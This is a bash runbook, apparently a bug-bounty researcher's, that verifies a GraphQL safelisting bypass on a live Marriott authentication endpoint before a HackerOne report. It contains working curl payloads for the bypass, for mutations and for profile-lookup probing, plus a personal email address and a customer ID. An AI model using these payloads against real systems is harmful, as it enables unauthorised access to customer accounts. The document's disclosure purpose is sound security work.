#!/usr/bin/env bash
# =============================================================================
# M022 FINAL VERIFICATION RUNBOOK — session24g
# Purpose : Verify every submittable claim before HackerOne report
# Evidence: Timestamps, response sizes, timing, verbatim bodies, auto-scored
# Run     : mkdir -p /tmp/s24g && bash PI-RUNBOOK-session24g-final-verify.sh \
#             2>&1 | tee /tmp/s24g/session24g-full.log
# =============================================================================
set -eo pipefail

OUTDIR=/tmp/s24g
mkdir -p "$OUTDIR"
BASE="https://auth-apc.marriott.com/mi/query"

HDRS='-H content-type:application/json -H application-name:account'

echo "============================================================"
echo "M022 FINAL VERIFICATION  $(date -u '+%Y-%m-%dT%H:%M:%SZ')"
echo "Researcher IP: $(curl -s ifconfig.me)"
echo "============================================================"
echo ""

# ─────────────────────────────────────────────────────────────────────────────
# TEST V1 — THREE-STATE DIFFERENTIAL  (core oracle, must pass all three)
# Claims: WRONG vars → FORBIDDEN; UNUSED var → bypass; USED var → FORBIDDEN
# ─────────────────────────────────────────────────────────────────────────────
echo "═══ V1: THREE-STATE DIFFERENTIAL ═══"
echo "Proves the flaw is in variable-declaration matching, not body hash"
echo ""

python3 << 'PYEOF'
import json

# V1a: Wrong variable declaration ($startYear missing) → safelisting should block
json.dump({
  "operationName": "phoenixAccountGetMemberStatusDetails",
  "variables": {"customerId": "VERIFY-ONLY-NOT-REAL"},
  "query": "query phoenixAccountGetMemberStatusDetails($customerId: ID!) { customer(id: $customerId) { __typename } }"
}, open("/tmp/s24g/v1a.json", "w"))

# V1b: CORRECT declaration + $startYear UNUSED in body → bypass
json.dump({
  "operationName": "phoenixAccountGetMemberStatusDetails",
  "variables": {"customerId": "VERIFY-ONLY-NOT-REAL", "startYear": 2026},
  "query": "query phoenixAccountGetMemberStatusDetails($customerId: ID!, $startYear: Int) { customer(id: $customerId) { __typename } }"
}, open("/tmp/s24g/v1b.json", "w"))

# V1c: CORRECT declaration + $startYear USED in body → safelisting re-engages
json.dump({
  "operationName": "phoenixAccountGetMemberStatusDetails",
  "variables": {"customerId": "VERIFY-ONLY-NOT-REAL", "startYear": 2026},
  "query": "query phoenixAccountGetMemberStatusDetails($customerId: ID!, $startYear: Int) { customer(id: $customerId) { loyaltyInformation { rewardsSummary { yearly(startYear: $startYear) { year } } } } }"
}, open("/tmp/s24g/v1c.json", "w"))
PYEOF

echo "[V1a] Wrong var decl — expect FORBIDDEN 111B:"
curl -s "$BASE/phoenixAccountGetMemberStatusDetails" \
  -H 'content-type: application/json' -H 'application-name: account' \
  -d @"$OUTDIR/v1a.json" \
  -o "$OUTDIR/v1a-body.txt" \
  -w "HTTP %{http_code} | %{size_download}B | time=%{time_total}s\n"
cat "$OUTDIR/v1a-body.txt"
echo ""

echo "[V1b] Correct decl, \$startYear UNUSED — expect GRAPHQL_VALIDATION_FAILED 207B (BYPASS):"
curl -s "$BASE/phoenixAccountGetMemberStatusDetails" \
  -H 'content-type: application/json' -H 'application-name: account' \
  -d @"$OUTDIR/v1b.json" \
  -o "$OUTDIR/v1b-body.txt" \
  -w "HTTP %{http_code} | %{size_download}B | time=%{time_total}s\n"
cat "$OUTDIR/v1b-body.txt"
echo ""

echo "[V1c] Correct decl, \$startYear USED in body — expect FORBIDDEN 111B:"
curl -s "$BASE/phoenixAccountGetMemberStatusDetails" \
  -H 'content-type: application/json' -H 'application-name: account' \
  -d @"$OUTDIR/v1c.json" \
  -o "$OUTDIR/v1c-body.txt" \
  -w "HTTP %{http_code} | %{size_download}B | time=%{time_total}s\n"
cat "$OUTDIR/v1c-body.txt"
echo ""

echo "[V1 auto-check]:"
python3 << 'PYEOF'
for tag, fname, want_key in [
    ("V1a", "v1a", "OPERATION_SIGNATURE_MISMATCH"),
    ("V1b", "v1b", "GRAPHQL_VALIDATION_FAILED"),
    ("V1c", "v1c", "OPERATION_SIGNATURE_MISMATCH"),
]:
    body = open(f"/tmp/s24g/{fname}-body.txt").read()
    hit  = want_key in body
    mark = "PASS" if hit else "FAIL"
    print(f"  {mark}  {tag}: contains '{want_key}'")
PYEOF
echo ""

# ─────────────────────────────────────────────────────────────────────────────
# TEST V2 — BYPASS SURVIVES EXPLICIT safelisting HEADER
# Claim: client sending graphql-require-safelisting: true does NOT harden check
# ─────────────────────────────────────────────────────────────────────────────
echo "═══ V2: BYPASS WITH EXPLICIT graphql-require-safelisting: true ═══"
echo "Proves header is cosmetic — server-side check is still variable-decl only"
echo ""

python3 << 'PYEOF'
import json
json.dump({
  "operationName": "phoenixAccountGetMemberStatusDetails",
  "variables": {"customerId": "VERIFY-ONLY-NOT-REAL", "startYear": 2026},
  "query": "query phoenixAccountGetMemberStatusDetails($customerId: ID!, $startYear: Int) { customer(id: $customerId) { __typename } }"
}, open("/tmp/s24g/v2.json", "w"))
PYEOF

echo "[V2] Bypass + explicit graphql-require-safelisting: true — expect GRAPHQL_VALIDATION_FAILED (not FORBIDDEN):"
curl -s "$BASE/phoenixAccountGetMemberStatusDetails" \
  -H 'content-type: application/json' \
  -H 'application-name: account' \
  -H 'graphql-require-safelisting: true' \
  -d @"$OUTDIR/v2.json" \
  -o "$OUTDIR/v2-body.txt" \
  -w "HTTP %{http_code} | %{size_download}B\n"
cat "$OUTDIR/v2-body.txt"
echo ""

# ─────────────────────────────────────────────────────────────────────────────
# TEST V3 — TIMING DIFFERENTIAL
# Claim: FORBIDDEN returns fast (gateway short-circuits); bypass is slower (Apollo round-trip)
# Concrete evidence that the two responses come from different layers
# ─────────────────────────────────────────────────────────────────────────────
echo "═══ V3: TIMING DIFFERENTIAL (gateway vs Apollo layer) ═══"
echo "FORBIDDEN should be faster — it's short-circuited at the safelisting gateway"
echo "BYPASS should be slower  — request travels all the way to the Apollo GraphQL engine"
echo ""

echo "[V3a] Three runs — FORBIDDEN (gateway short-circuit):"
for i in 1 2 3; do
  curl -s "$BASE/phoenixAccountGetMemberStatusDetails" \
    -H 'content-type: application/json' -H 'application-name: account' \
    -d @"$OUTDIR/v1a.json" \
    -o /dev/null \
    -w "  run $i: %{time_total}s\n"
done

echo ""
echo "[V3b] Three runs — BYPASS (Apollo round-trip):"
for i in 1 2 3; do
  curl -s "$BASE/phoenixAccountGetMemberStatusDetails" \
    -H 'content-type: application/json' -H 'application-name: account' \
    -d @"$OUTDIR/v1b.json" \
    -o /dev/null \
    -w "  run $i: %{time_total}s\n"
done
echo "(bypass should average 2-5× longer than FORBIDDEN)"
echo ""

# ─────────────────────────────────────────────────────────────────────────────
# TEST V4 — INTROSPECTION BYPASS (independent architecture proof)
# Claim: bypass routes requests to Apollo — proven by Apollo-specific error codes
# The FORBIDDEN error comes from the safelisting gateway; INTROSPECTION_DISABLED
# and GRAPHQL_VALIDATION_FAILED are Apollo-internal codes unreachable if blocked.
# ─────────────────────────────────────────────────────────────────────────────
echo "═══ V4: INTROSPECTION VIA BYPASS (Apollo-layer architecture proof) ═══"
echo "Introspection disabled by Apollo, not by safelisting gateway"
echo "If bypass reaches Apollo, we see INTROSPECTION_DISABLED; if blocked, we see FORBIDDEN"
echo ""

python3 << 'PYEOF'
import json
json.dump({
  "operationName": "phoenixAccountGetMemberStatusDetails",
  "variables": {"customerId": "VERIFY-ONLY-NOT-REAL", "startYear": 2026},
  "query": "query phoenixAccountGetMemberStatusDetails($customerId: ID!, $startYear: Int) { __schema { queryType { name } } }"
}, open("/tmp/s24g/v4.json", "w"))
PYEOF

echo "[V4] Introspection query via bypass — expect INTROSPECTION_DISABLED (not FORBIDDEN):"
curl -s "$BASE/phoenixAccountGetMemberStatusDetails" \
  -H 'content-type: application/json' -H 'application-name: account' \
  -d @"$OUTDIR/v4.json" \
  -o "$OUTDIR/v4-body.txt" \
  -w "HTTP %{http_code} | %{size_download}B\n"
cat "$OUTDIR/v4-body.txt"
echo ""

# ─────────────────────────────────────────────────────────────────────────────
# TEST V5 — MUTATION BYPASS (write-side impact — adds I:L to CVSS)
# Claim: mutation operations bypass safelisting with $customerId: ID! declaration
# ─────────────────────────────────────────────────────────────────────────────
echo "═══ V5: MUTATION BYPASS (write-side: UpdateCustomerConsents + RegisterPromotion) ═══"
echo "Proves bypass is not limited to read operations"
echo ""

python3 << 'PYEOF'
import json

# Mutation 1 — UpdateCustomerConsents
json.dump({
  "operationName": "phoenixAccountUpdateCustomerConsents",
  "variables": {"customerId": "VERIFY-ONLY-NOT-REAL"},
  "query": "mutation phoenixAccountUpdateCustomerConsents($customerId: ID!) { __typename }"
}, open("/tmp/s24g/v5-mut1.json", "w"))

# Mutation 2 — RegisterPromotion
json.dump({
  "operationName": "phoenixAccountRegisterPromotion",
  "variables": {"customerId": "VERIFY-ONLY-NOT-REAL"},
  "query": "mutation phoenixAccountRegisterPromotion($customerId: ID!) { __typename }"
}, open("/tmp/s24g/v5-mut2.json", "w"))

# Control: same mutation, WRONG var type → must be FORBIDDEN if safelisting is active
json.dump({
  "operationName": "phoenixAccountUpdateCustomerConsents",
  "variables": {"notCustomerId": True},
  "query": "mutation phoenixAccountUpdateCustomerConsents($notCustomerId: Boolean) { __typename }"
}, open("/tmp/s24g/v5-control.json", "w"))
PYEOF

echo "[V5-ctrl] Mutation with WRONG var type — expect FORBIDDEN (confirms mutations ARE safelisted):"
curl -s "$BASE/phoenixAccountUpdateCustomerConsents" \
  -H 'content-type: application/json' -H 'application-name: account' \
  -d @"$OUTDIR/v5-control.json" \
  -o "$OUTDIR/v5-control-body.txt" \
  -w "HTTP %{http_code} | %{size_download}B\n"
cat "$OUTDIR/v5-control-body.txt"
echo ""

echo "[V5a] UpdateCustomerConsents bypass — expect GRAPHQL_VALIDATION_FAILED (not FORBIDDEN):"
curl -s "$BASE/phoenixAccountUpdateCustomerConsents" \
  -H 'content-type: application/json' -H 'application-name: account' \
  -d @"$OUTDIR/v5-mut1.json" \
  -o "$OUTDIR/v5-mut1-body.txt" \
  -w "HTTP %{http_code} | %{size_download}B\n"
cat "$OUTDIR/v5-mut1-body.txt"
echo ""

echo "[V5b] RegisterPromotion bypass — expect GRAPHQL_VALIDATION_FAILED (not FORBIDDEN):"
curl -s "$BASE/phoenixAccountRegisterPromotion" \
  -H 'content-type: application/json' -H 'application-name: account' \
  -d @"$OUTDIR/v5-mut2.json" \
  -o "$OUTDIR/v5-mut2-body.txt" \
  -w "HTTP %{http_code} | %{size_download}B\n"
cat "$OUTDIR/v5-mut2-body.txt"
echo ""

# ─────────────────────────────────────────────────────────────────────────────
# TEST V6 — lookupCustomerProfiles ZERO SAFELISTING
# Claim: this operation has NO safelisting at all — any variable signature passes
# Proof method: four-state matrix contrasting against a safelisted operation
# ─────────────────────────────────────────────────────────────────────────────
echo "═══ V6: lookupCustomerProfiles ZERO SAFELISTING (four-state matrix) ═══"
echo "Matrix: WRONG vars on safelisted op → FORBIDDEN"
echo "        WRONG vars on lookup op     → NOT FORBIDDEN (zero safelisting)"
echo ""

python3 << 'PYEOF'
import json

# V6a: safelisted op + WRONG var type/name → MUST be FORBIDDEN
json.dump({
  "operationName": "phoenixAccountGetMemberStatusDetails",
  "variables": {"totally": "wrong"},
  "query": "query phoenixAccountGetMemberStatusDetails($totally: String) { __typename }"
}, open("/tmp/s24g/v6a.json", "w"))

# V6b: lookup op + SAME wrong vars → should NOT be FORBIDDEN (no registration)
json.dump({
  "operationName": "phoenixAccountLookupCustomerProfiles",
  "variables": {"totally": "wrong"},
  "query": "query phoenixAccountLookupCustomerProfiles($totally: String) { __typename }"
}, open("/tmp/s24g/v6b.json", "w"))

# V6c: lookup op + completely junk variable ($z: Boolean) → should NOT be FORBIDDEN
json.dump({
  "operationName": "phoenixAccountLookupCustomerProfiles",
  "variables": {"z": True},
  "query": "query phoenixAccountLookupCustomerProfiles($z: Boolean) { __typename }"
}, open("/tmp/s24g/v6c.json", "w"))

# V6d: lookup op + NO variables at all → should NOT be FORBIDDEN
json.dump({
  "operationName": "phoenixAccountLookupCustomerProfiles",
  "variables": {},
  "query": "query phoenixAccountLookupCustomerProfiles { __typename }"
}, open("/tmp/s24g/v6d.json", "w"))
PYEOF

echo "[V6a] GetMemberStatusDetails + wrong vars — MUST be FORBIDDEN (control):"
curl -s "$BASE/phoenixAccountGetMemberStatusDetails" \
  -H 'content-type: application/json' -H 'application-name: account' \
  -d @"$OUTDIR/v6a.json" \
  -o "$OUTDIR/v6a-body.txt" \
  -w "HTTP %{http_code} | %{size_download}B\n"
cat "$OUTDIR/v6a-body.txt"
echo ""

echo "[V6b] LookupCustomerProfiles + same wrong vars — expect NOT FORBIDDEN:"
curl -s "$BASE/phoenixAccountLookupCustomerProfiles" \
  -H 'content-type: application/json' -H 'application-name: account' \
  -d @"$OUTDIR/v6b.json" \
  -o "$OUTDIR/v6b-body.txt" \
  -w "HTTP %{http_code} | %{size_download}B\n"
cat "$OUTDIR/v6b-body.txt"
echo ""

echo "[V6c] LookupCustomerProfiles + junk var (\$z: Boolean) — expect NOT FORBIDDEN:"
curl -s "$BASE/phoenixAccountLookupCustomerProfiles" \
  -H 'content-type: application/json' -H 'application-name: account' \
  -d @"$OUTDIR/v6c.json" \
  -o "$OUTDIR/v6c-body.txt" \
  -w "HTTP %{http_code} | %{size_download}B\n"
cat "$OUTDIR/v6c-body.txt"
echo ""

echo "[V6d] LookupCustomerProfiles + NO variables at all — expect NOT FORBIDDEN:"
curl -s "$BASE/phoenixAccountLookupCustomerProfiles" \
  -H 'content-type: application/json' -H 'application-name: account' \
  -d @"$OUTDIR/v6d.json" \
  -o "$OUTDIR/v6d-body.txt" \
  -w "HTTP %{http_code} | %{size_download}B\n"
cat "$OUTDIR/v6d-body.txt"
echo ""

echo "[V6 auto-check]:"
python3 << 'PYEOF'
import os
checks = [
    ("V6a (safelisted op + wrong vars)",   "v6a", True,  "OPERATION_SIGNATURE_MISMATCH"),
    ("V6b (lookup op + wrong vars)",       "v6b", False, "OPERATION_SIGNATURE_MISMATCH"),
    ("V6c (lookup op + junk var)",         "v6c", False, "OPERATION_SIGNATURE_MISMATCH"),
    ("V6d (lookup op + no vars)",          "v6d", False, "OPERATION_SIGNATURE_MISMATCH"),
]
all_pass = True
for label, fname, want_forbidden, marker in checks:
    body = open(f"/tmp/s24g/{fname}-body.txt").read()
    found = marker in body
    ok = found == want_forbidden
    all_pass = all_pass and ok
    direction = "FORBIDDEN" if want_forbidden else "NOT FORBIDDEN"
    print(f"  {'PASS' if ok else 'FAIL'}  {label}: expect {direction}")
print()
print("ZERO SAFELISTING CONFIRMED" if all_pass else "MANUAL REVIEW NEEDED")
PYEOF
echo ""

# ─────────────────────────────────────────────────────────────────────────────
# TEST V7 — lookupCustomerProfiles RESOLVER REACHES APOLLO
# Claim: with correct input, the lookup resolver runs — Apollo error oracle confirms
# This is the strongest unauthenticated proof that the operation is live and executable
# ─────────────────────────────────────────────────────────────────────────────
echo "═══ V7: lookupCustomerProfiles RESOLVER REACHES APOLLO (error-based oracle) ═══"
echo "Send correct input with a known-bad field. Expect Apollo 'Cannot query field' error."
echo "This proves: (1) request reaches Apollo, (2) lookupCustomerProfiles resolver runs"
echo ""

python3 << 'PYEOF'
import json

# V7a: Correct input, non-existent response field → Apollo "Cannot query field" error
json.dump({
  "operationName": "phoenixAccountLookupCustomerProfiles",
  "variables": {
    "email": "nobody@example.com",
    "firstName": "Nobody",
    "lastName": "Nobody",
    "country": "US"
  },
  "query": """query phoenixAccountLookupCustomerProfiles(
    $email: String!, $firstName: String!, $lastName: String!, $country: String!
  ) {
    lookupCustomerProfiles(input: {
      email: $email, firstName: $firstName, lastName: $lastName, country: $country
    }) {
      definitivelyNonExistentField
    }
  }"""
}, open("/tmp/s24g/v7a.json", "w"))

# V7b: Missing required input field → Apollo "required field" validation error
json.dump({
  "operationName": "phoenixAccountLookupCustomerProfiles",
  "variables": {"email": "nobody@example.com"},
  "query": """query phoenixAccountLookupCustomerProfiles($email: String!) {
    lookupCustomerProfiles(input: { email: $email }) {
      __typename
    }
  }"""
}, open("/tmp/s24g/v7b.json", "w"))
PYEOF

echo "[V7a] Correct input + nonExistentField — expect Apollo 'Cannot query field' (confirms resolver runs):"
curl -s "$BASE/phoenixAccountLookupCustomerProfiles" \
  -H 'content-type: application/json' -H 'application-name: account' \
  -d @"$OUTDIR/v7a.json" \
  -o "$OUTDIR/v7a-body.txt" \
  -w "HTTP %{http_code} | %{size_download}B\n"
cat "$OUTDIR/v7a-body.txt"
echo ""

echo "[V7b] Missing required input fields — expect Apollo 'required field' error:"
curl -s "$BASE/phoenixAccountLookupCustomerProfiles" \
  -H 'content-type: application/json' -H 'application-name: account' \
  -d @"$OUTDIR/v7b.json" \
  -o "$OUTDIR/v7b-body.txt" \
  -w "HTTP %{http_code} | %{size_download}B\n"
cat "$OUTDIR/v7b-body.txt"
echo ""

# ─────────────────────────────────────────────────────────────────────────────
# TEST V8 — UNAUTHENTICATED USER ENUMERATION CHECK
# Claim: lookupCustomerProfiles does NOT differentiate real vs fake email without auth
# This bounds the unauthenticated impact (no IDOR without auth)
# ─────────────────────────────────────────────────────────────────────────────
echo "═══ V8: UNAUTHENTICATED USER ENUMERATION CHECK ═══"
echo "Real vs fake email should produce identical responses (confirms auth required for data)"
echo ""

OWN_EMAIL="azmolhaque95@gmail.com"  # own account email — confirmed S24f

python3 << 'PYEOF'
import json, os

own = os.environ.get("OWN_EMAIL", "azmolhaque95@gmail.com")

# V8a: own real email
json.dump({
  "operationName": "phoenixAccountLookupCustomerProfiles",
  "variables": {"email": own, "firstName": "Azmol", "lastName": "Haque", "country": "BD"},
  "query": """query phoenixAccountLookupCustomerProfiles(
    $email: String!, $firstName: String!, $lastName: String!, $country: String!
  ) {
    lookupCustomerProfiles(input: {
      email: $email, firstName: $firstName, lastName: $lastName, country: $country
    }) {
      __typename
    }
  }"""
}, open("/tmp/s24g/v8a.json", "w"))

# V8b: fake email that should not exist
json.dump({
  "operationName": "phoenixAccountLookupCustomerProfiles",
  "variables": {"email": "definitely.fake.12345xyz@nowhere.invalid", "firstName": "Fake", "lastName": "Person", "country": "US"},
  "query": """query phoenixAccountLookupCustomerProfiles(
    $email: String!, $firstName: String!, $lastName: String!, $country: String!
  ) {
    lookupCustomerProfiles(input: {
      email: $email, firstName: $firstName, lastName: $lastName, country: $country
    }) {
      __typename
    }
  }"""
}, open("/tmp/s24g/v8b.json", "w"))
PYEOF

echo "[V8a] OWN real email (unauthenticated):"
curl -s "$BASE/phoenixAccountLookupCustomerProfiles" \
  -H 'content-type: application/json' -H 'application-name: account' \
  -d @"$OUTDIR/v8a.json" \
  -o "$OUTDIR/v8a-body.txt" \
  -w "HTTP %{http_code} | %{size_download}B\n"
cat "$OUTDIR/v8a-body.txt"
echo ""

echo "[V8b] FAKE non-existent email (unauthenticated):"
curl -s "$BASE/phoenixAccountLookupCustomerProfiles" \
  -H 'content-type: application/json' -H 'application-name: account' \
  -d @"$OUTDIR/v8b.json" \
  -o "$OUTDIR/v8b-body.txt" \
  -w "HTTP %{http_code} | %{size_download}B\n"
cat "$OUTDIR/v8b-body.txt"
echo ""

echo "[V8 analysis]:"
python3 << 'PYEOF'
with open("/tmp/s24g/v8a-body.txt") as f: a = f.read()
with open("/tmp/s24g/v8b-body.txt") as f: b = f.read()
identical = a.strip() == b.strip()
print(f"  V8a size: {len(a.encode())}B")
print(f"  V8b size: {len(b.encode())}B")
if identical:
    print("  SAME response — no unauthenticated user enumeration (expected)")
    print("  Claim: authenticated session required for data access — CONFIRMED")
else:
    print("  DIFFERENT responses — possible unauthenticated enumeration (investigate)")
    print("  diff:")
    import difflib
    for line in difflib.unified_diff(a.splitlines(), b.splitlines(), lineterm=''):
        print(f"    {line}")
PYEOF
echo ""

# ─────────────────────────────────────────────────────────────────────────────
# TEST V9 — AUTHENTICATED TEST (optional, requires valid session cookies)
# Run this section ONLY if you have fresh Marriott Bonvoy cookies from
# www.marriott.com (DevTools → Application → Cookies → copy all).
# Paste the cookie string into COOKIE below and uncomment this block.
# ─────────────────────────────────────────────────────────────────────────────
echo "═══ V9: AUTHENTICATED TEST (OPTIONAL — uncomment and fill COOKIE) ═══"
echo "Skipped — no auth-apc-scoped cookie available"
echo "To run: set COOKIE environment variable and uncomment V9 block in runbook"
echo ""

# COOKIE="mi_token=...; sessionid=...; ..."   # paste from browser DevTools
# if [[ -n "${COOKIE:-}" ]]; then
#   python3 << 'PYEOF'
#   import json
#   json.dump({
#     "operationName": "phoenixAccountGetMemberStatusDetails",
#     "variables": {"customerId": "580EF43FAD482F46B04E29FE433CC4828.U1", "startYear": 2026},
#     "query": "query phoenixAccountGetMemberStatusDetails($customerId: ID!, $startYear: Int) { customer(id: $customerId) { contactInformation { emails { address } } profile { name { givenName } } } }"
#   }, open("/tmp/s24g/v9-own.json", "w"))
#   PYEOF
#
#   echo "[V9a] OWN account bypass with auth — expect actual profile data:"
#   curl -s "$BASE/phoenixAccountGetMemberStatusDetails" \
#     -H 'content-type: application/json' -H 'application-name: account' \
#     -H "Cookie: $COOKIE" \
#     -d @"$OUTDIR/v9-own.json" \
#     -o "$OUTDIR/v9-own-body.txt" \
#     -w "HTTP %{http_code} | %{size_download}B\n"
#   cat "$OUTDIR/v9-own-body.txt"
# fi

# ─────────────────────────────────────────────────────────────────────────────
# FINAL VERDICT
# ─────────────────────────────────────────────────────────────────────────────
echo "════════════════════════════════════════════"
echo "VERIFICATION SUMMARY"
echo "════════════════════════════════════════════"

python3 << 'PYEOF'
import os

tests = [
    # (label, file, expect_contains, want_present)
    ("V1a Wrong vars → FORBIDDEN",            "v1a-body.txt",      "OPERATION_SIGNATURE_MISMATCH", True),
    ("V1b Unused var → BYPASS (VAL_FAILED)",  "v1b-body.txt",      "GRAPHQL_VALIDATION_FAILED",    True),
    ("V1c Used var → FORBIDDEN",              "v1c-body.txt",      "OPERATION_SIGNATURE_MISMATCH", True),
    ("V2  Bypass + explicit header",          "v2-body.txt",       "GRAPHQL_VALIDATION_FAILED",    True),
    ("V4  Introspection bypass (Apollo layer)","v4-body.txt",       "FORBIDDEN",                    False),
    ("V5c Mutation ctrl: WRONG var → FORBID", "v5-control-body.txt","OPERATION_SIGNATURE_MISMATCH",True),
    ("V5a Mutation bypass UpdateConsents",    "v5-mut1-body.txt",  "OPERATION_SIGNATURE_MISMATCH", False),
    ("V5b Mutation bypass RegisterPromo",     "v5-mut2-body.txt",  "OPERATION_SIGNATURE_MISMATCH", False),
    ("V6a Safelisted op + wrong vars → FORBID","v6a-body.txt",     "OPERATION_SIGNATURE_MISMATCH", True),
    ("V6b Lookup op + wrong vars → NOT FORBID","v6b-body.txt",     "OPERATION_SIGNATURE_MISMATCH", False),
    ("V6c Lookup op + junk var → NOT FORBID", "v6c-body.txt",      "OPERATION_SIGNATURE_MISMATCH", False),
    ("V6d Lookup op + no vars → NOT FORBID",  "v6d-body.txt",      "OPERATION_SIGNATURE_MISMATCH", False),
]

passed, failed, skipped = 0, 0, 0
for label, fname, marker, want in tests:
    path = f"/tmp/s24g/{fname}"
    if not os.path.exists(path):
        print(f"  SKIP  {label}")
        skipped += 1
        continue
    body = open(path).read()
    found = marker in body
    ok = found == want
    if ok:
        passed += 1
        print(f"  PASS  {label}")
    else:
        failed += 1
        print(f"  FAIL  {label}  (marker '{marker}' found={found}, want={want})")

print()
print(f"Result: {passed} PASS / {failed} FAIL / {skipped} SKIP")
print()
if failed == 0 and passed >= 8:
    print("ALL CLAIMS VERIFIED — M022 ready for HackerOne submission")
    print("Remaining blockers: Pi screenshot (#6) + first-person narrative (#7)")
elif failed == 0:
    print("PARTIAL VERIFICATION — check skipped tests")
else:
    print("FAILURES DETECTED — investigate before submitting")
PYEOF

echo ""
echo "Evidence directory: $OUTDIR"
echo "Full log:           $OUTDIR/session24g-full.log"
echo "Run complete:       $(date -u '+%Y-%m-%dT%H:%M:%SZ')"
